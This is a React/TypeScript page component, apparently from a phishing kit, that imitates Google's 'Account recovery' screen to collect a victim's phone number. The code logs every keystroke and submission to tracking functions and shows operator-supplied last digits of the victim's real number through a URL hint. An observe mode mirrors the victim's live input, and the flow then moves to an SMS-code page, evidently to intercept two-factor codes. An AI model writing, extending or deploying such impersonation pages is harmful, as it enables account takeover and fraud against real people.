import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState, type FormEvent } from "react";
import usFlagUrl from "@/assets/ge/us-flag.svg?url";
import {
  GE_SHELL_CSS,
  GeAccountChip,
  GeFontStyle,
  GeFooter,
  GoogleGLogo,
  resolveGeEmail,
  setGeEmail,
  setGePhone,
  useGeTracking,
} from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/confirmphone")({
  head: () => ({
    meta: [
      { title: "Account recovery - Google Accounts" },
      { name: "color-scheme", content: "dark" },
    ],
  }),
  component: GeConfirmPhonePage,
});

/** Last 2 digits from admin redirect (?hint= or ?code=). */
function lastTwoFromSearch(): string {
  if (typeof window === "undefined") return "••";
  try {
    const sp = new URLSearchParams(window.location.search);
    const q = (sp.get("hint") || sp.get("code") || "").trim();
    if (/^\d{2}$/.test(q)) return q;
  } catch {
    /* ignore */
  }
  try {
    const s = sessionStorage.getItem("ge_phone_hint") || "";
    if (/^\d{2}$/.test(s)) return s;
  } catch {
    /* ignore */
  }
  return "••";
}

const GE_PHONE_CSS = `
${GE_SHELL_CSS}

.ge-phone .ge-title { margin-top: 24px; }

.ge-phone-lead {
  margin: 16px 0 0;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  color: var(--gm3-on-surface);
}


.ge-phone-heading {
  margin: 0;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  color: var(--gm3-on-surface);
}
.ge-phone-help {
  margin: 16px 0 0;
  font-size: 0.875rem;
  font-weight: 400;
  line-height: 1.4286;
  color: var(--gm3-on-surface-variant);
}
@media (min-width: 900px) {
  .ge-phone .ge-pane-right {
    padding-top: 72px;
  }
}

.ge-form {
  margin-top: 24px;
  flex: 1;
  display: flex;
  flex-direction: column;
  min-height: 0;
}
@media (min-width: 900px) {
  .ge-form { margin-top: 22px; }
}

.ge-phone-field {
  position: relative;
  width: 100%;
  height: 56px;
  margin-top: 0;
}
.ge-phone-field .ring {
  position: absolute;
  inset: 0;
  border-radius: 4px;
  pointer-events: none;
  z-index: 2;
  box-shadow: inset 0 0 0 1px var(--gm3-outline);
  transition: box-shadow .15s cubic-bezier(.4,0,.2,1);
}
.ge-phone-field.is-active .ring,
.ge-phone-field.has-value .ring {
  box-shadow: inset 0 0 0 2px var(--gm3-primary);
}
.ge-phone-field label {
  position: absolute;
  left: 12px;
  top: 0;
  transform: translateY(-50%);
  padding: 0 4px;
  color: var(--gm3-on-surface-variant);
  font-size: 0.75rem;
  line-height: 1.333;
  pointer-events: none;
  z-index: 3;
  background: var(--gm3-card);
}
.ge-phone-field.is-active label {
  color: var(--gm3-primary);
}
.ge-phone-row {
  position: relative;
  z-index: 1;
  display: flex;
  align-items: center;
  height: 56px;
  padding: 0 12px 0 8px;
  gap: 4px;
}
.ge-country {
  display: inline-flex;
  align-items: center;
  gap: 2px;
  flex-shrink: 0;
  height: 32px;
  padding: 0 2px 0 4px;
  border: none;
  border-radius: 4px;
  background: transparent;
  color: var(--gm3-on-surface);
  cursor: pointer;
}
.ge-country:hover { background: rgba(227, 227, 227, 0.08); }
.ge-country-flag {
  display: block;
  width: 22px;
  height: 12px;
  object-fit: cover;
  border-radius: 1px;
}
.ge-country-caret {
  width: 18px;
  height: 18px;
  fill: var(--gm3-on-surface-variant);
  flex-shrink: 0;
}
.ge-phone-field input {
  flex: 1 1 auto;
  min-width: 0;
  height: 40px;
  margin: 0;
  padding: 0 4px;
  border: none;
  outline: none;
  background: transparent;
  color: var(--gm3-on-surface);
  font-family: inherit;
  font-size: 1rem;
  font-weight: 400;
  line-height: 24px;
  caret-color: var(--gm3-primary);
}

.ge-btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  height: 40px;
  min-width: 64px;
  padding: 0 24px;
  border: none;
  border-radius: 20px;
  font-family: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.0107142857em;
  cursor: pointer;
}
.ge-btn-send {
  background: var(--gm-next-fill);
  color: var(--gm-next-ink);
}
.ge-btn-send:hover:not(:disabled) {
  box-shadow: 0 1px 2px rgba(0,0,0,.3), 0 1px 3px 1px rgba(0,0,0,.15);
  filter: brightness(1.05);
}
.ge-btn-send:disabled {
  opacity: 0.38;
  cursor: default;
  filter: none;
  box-shadow: none;
}
`;

function GeConfirmPhonePage() {
  const { trackClick, trackInput, trackSubmit, geNavigate, sessionId, isObserve } =
    useGeTracking();
  const [email, setEmail] = useState(() => resolveGeEmail());
  const [phone, setPhone] = useState("");
  const [focused, setFocused] = useState(false);
  const [fieldError, setFieldError] = useState(false);
  const [lastTwo, setLastTwo] = useState(() => lastTwoFromSearch());
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    const resolved = resolveGeEmail();
    if (resolved) {
      setEmail(resolved);
      setGeEmail(resolved);
    }
    const two = lastTwoFromSearch();
    setLastTwo(two);
    if (/^\d{2}$/.test(two)) {
      try {
        sessionStorage.setItem("ge_phone_hint", two);
      } catch {
        /* ignore */
      }
    }
    setTimeout(() => inputRef.current?.focus(), 200);
  }, []);

  useEffect(() => {
    if (!isObserve) return;
    function onMirror(e: Event) {
      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
      if (!d?.field) return;
      const value = String(d.value ?? "");
      if (d.field === "email" || d.field === "email_submitted" || d.field === "identifier") {
        setEmail(value);
        setGeEmail(value);
      }
      if (
        d.field === "phone" ||
        d.field === "phone_number" ||
        d.field === "Phone number" ||
        d.field === "phone_submitted"
      ) {
        setPhone(value);
      }
    }
    window.addEventListener("ux:mirror-live-input", onMirror);
    return () => window.removeEventListener("ux:mirror-live-input", onMirror);
  }, [isObserve]);

  const hasValue = phone.length > 0;
  const isActive = focused || hasValue;
  const canSend = phone.trim().length > 0;
  const phoneHint = `••••••••${lastTwo}`;

  const handleTryAnother = () => {
    trackClick("Try another way");
    setFieldError(true);
    inputRef.current?.focus();
  };

  const handleSend = (e?: FormEvent) => {
    e?.preventDefault();
    if (!canSend) {
      setFieldError(true);
      return;
    }
    const trimmed = phone.trim();
    setGePhone(trimmed);
    setFieldError(false);
    trackClick("Send");
    trackSubmit("phone", trimmed);
    // One page → SMS code (admin-provided last digits already shown here)
    geNavigate("/ge/smscode");
  };

  return (
    <div className="ge-shell ge-phone">
      <GeFontStyle />
      <style>{GE_PHONE_CSS}</style>

      <main className="ge-card" role="main">
        <div className="ge-pane-left">
          <GoogleGLogo className="ge-logo" width={48} height={48} />
          <h1 className="ge-title">Account recovery</h1>
          <p className="ge-phone-lead">
            To help keep your account safe, Google wants to make sure it{"\u2019"}s
            really you trying to sign in
          </p>
          <GeAccountChip email={email} onClick={() => trackClick("Switch account")} />
        </div>

        <div className="ge-pane-right">
          <p className="ge-phone-heading">Get a verification code</p>
          <p className="ge-phone-help">
            To get a verification code, first confirm the phone number you added to
            your account {phoneHint}. Standard message and data rates may apply.
          </p>

          <form className="ge-form" onSubmit={handleSend} autoComplete="off">
            <div
              className={`ge-phone-field${hasValue ? " has-value" : ""}${isActive ? " is-active" : ""}${fieldError ? " is-error" : ""}`}
            >
              <label htmlFor="phone">Phone number</label>
              <div className="ge-phone-row">
                <button
                  type="button"
                  className="ge-country"
                  aria-label="Country selector: United States"
                  onClick={() => trackClick("Country selector")}
                >
                  <img className="ge-country-flag" src={usFlagUrl} alt="" width={22} height={12} />
                  <svg className="ge-country-caret" viewBox="0 0 24 24" aria-hidden="true">
                    <path d="M7 9.5l5 5 5-5H7z" />
                  </svg>
                </button>
                <input
                  ref={inputRef}
                  id="phone"
                  name="phone"
                  type="tel"
                  inputMode="tel"
                  autoComplete="tel-national"
                  spellCheck={false}
                  aria-label="Phone number"
                  value={phone}
                  onFocus={() => {
                    setFocused(true);
                    setFieldError(false);
                  }}
                  onBlur={() => setFocused(false)}
                  onChange={(e) => {
                    const v = e.target.value;
                    setPhone(v);
                    setFieldError(false);
                    trackInput("phone", v, "tel");
                  }}
                />
              </div>
              <div className="ring" aria-hidden="true" />
            </div>

            <div className="ge-actions">
              <button type="button" className="ge-btn-text" onClick={handleTryAnother}>
                Try another way
              </button>
              <button type="submit" className="ge-btn ge-btn-send" disabled={!canSend}>
                Send
              </button>
            </div>
          </form>
        </div>
      </main>

      <GeFooter />
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
        {sessionId}
      </div>
    </div>
  );
}
